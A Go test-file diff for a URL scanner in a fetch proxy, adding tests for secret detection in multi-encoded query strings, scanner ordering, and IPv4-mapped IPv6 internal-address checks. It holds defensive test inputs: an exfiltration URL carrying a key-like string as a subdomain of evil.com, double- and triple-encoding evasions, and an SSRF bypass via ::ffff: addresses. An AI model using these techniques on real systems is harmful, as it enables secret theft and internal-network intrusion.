@@ -467,6 +467,52 @@ func TestScan_DLPChecksDecodedQueryKeys(t *testing.T) {
 	}
 }
 
+func TestScan_DLPCatchesDoubleEncodedSecret(t *testing.T) {
+	s := New(testConfig())
+
+	// Double-encoded dashes: %252D → first decode → %2D → second decode → -
+	result := s.Scan("https://example.com/api?key=sk%252Dant%252DabcdefghijklmnopqrstuVW")
+	if result.Allowed {
+		t.Error("expected DLP to catch double-encoded Anthropic key")
+	}
+	if result.Scanner != "dlp" {
+		t.Errorf("expected scanner=dlp, got %s", result.Scanner)
+	}
+}
+
+func TestScan_DLPCatchesTripleEncodedSecret(t *testing.T) {
+	s := New(testConfig())
+
+	// Triple-encoded: %25252D → %252D → %2D → -
+	result := s.Scan("https://example.com/api?key=sk%25252Dant%25252DabcdefghijklmnopqrstuVW")
+	if result.Allowed {
+		t.Error("expected DLP to catch triple-encoded Anthropic key")
+	}
+}
+
+func TestIterativeDecode(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"no_encoding", "hello", "hello"},
+		{"single", "sk%2Dant", "sk-ant"},
+		{"double", "sk%252Dant", "sk-ant"},
+		{"triple", "sk%25252Dant", "sk-ant"},
+		{"malformed", "sk%ZZant", "sk%ZZant"},
+		{"empty", "", ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := iterativeDecode(tt.input)
+			if got != tt.want {
+				t.Errorf("iterativeDecode(%q) = %q, want %q", tt.input, got, tt.want)
+			}
+		})
+	}
+}
+
 // --- Fix 2: IP address wildcard matching ---
 
 func TestMatchDomain_WildcardIgnoredForIPv4(t *testing.T) {
@@ -821,19 +867,38 @@ func TestScan_DataURIScheme(t *testing.T) {
 	}
 }
 
-func TestScan_ScanOrderSSRFBeforeBlocklist(t *testing.T) {
+func TestScan_ScanOrderBlocklistBeforeSSRF(t *testing.T) {
 	cfg := testConfig()
 	cfg.Internal = []string{"127.0.0.0/8"}
 	cfg.FetchProxy.Monitoring.Blocklist = []string{"localhost"}
 	s := New(cfg)
 
-	// localhost resolves to 127.0.0.1 — SSRF should fire first since it's checked before blocklist
+	// Blocklist fires before SSRF (no DNS resolution needed for blocklist).
+	// localhost matches both blocklist and SSRF, but blocklist is checked first.
 	result := s.Scan("http://localhost/test")
 	if result.Allowed {
 		t.Fatal("expected to be blocked")
 	}
-	if result.Scanner != "ssrf" {
-		t.Errorf("expected scanner=ssrf (checked first), got %s", result.Scanner)
+	if result.Scanner != "blocklist" {
+		t.Errorf("expected scanner=blocklist (checked first), got %s", result.Scanner)
+	}
+}
+
+func TestScan_DLPCatchesSecretInHostnameBeforeDNS(t *testing.T) {
+	cfg := testConfig()
+	// Enable SSRF so DNS resolution would happen — but DLP should fire first.
+	cfg.Internal = []string{"10.0.0.0/8"}
+	s := New(cfg)
+
+	// Attacker encodes an Anthropic key as a subdomain: DNS query for this
+	// hostname would exfiltrate the key via DNS even if the request is later
+	// blocked by SSRF. DLP must catch it BEFORE DNS resolution.
+	result := s.Scan("https://sk-ant-abcdefghijklmnopqrstuVW.evil.com/exfil")
+	if result.Allowed {
+		t.Fatal("expected DLP to catch secret in hostname")
+	}
+	if result.Scanner != "dlp" {
+		t.Errorf("expected scanner=dlp (runs before DNS), got %s", result.Scanner)
 	}
 }
 
@@ -973,6 +1038,36 @@ func TestIsInternalIP_MatchesConfiguredCIDR(t *testing.T) {
 
 	for _, tt := range tests {
 		ip := net.ParseIP(tt.ip)
+		got := s.IsInternalIP(ip)
+		if got != tt.internal {
+			t.Errorf("IsInternalIP(%s) = %v, want %v", tt.ip, got, tt.internal)
+		}
+	}
+}
+
+func TestIsInternalIP_IPv4MappedIPv6(t *testing.T) {
+	cfg := testConfig()
+	cfg.Internal = []string{"127.0.0.0/8", "10.0.0.0/8"}
+	s := New(cfg)
+
+	// IPv4-mapped IPv6 addresses like ::ffff:127.0.0.1 must match IPv4 CIDRs.
+	// Without To4() normalization, the 16-byte IPv6 form wouldn't match the
+	// 4-byte 127.0.0.0/8 CIDR — this was the original SSRF bypass vector.
+	tests := []struct {
+		ip       string
+		internal bool
+	}{
+		{"::ffff:127.0.0.1", true},
+		{"::ffff:10.0.0.1", true},
+		{"::ffff:8.8.8.8", false},
+		{"::ffff:192.168.1.1", false}, // 192.168.0.0/16 not in this config
+	}
+
+	for _, tt := range tests {
+		ip := net.ParseIP(tt.ip)
+		if ip == nil {
+			t.Fatalf("failed to parse IP %s", tt.ip)
+		}
 		got := s.IsInternalIP(ip)
 		if got != tt.internal {
 			t.Errorf("IsInternalIP(%s) = %v, want %v", tt.ip, got, tt.internal)
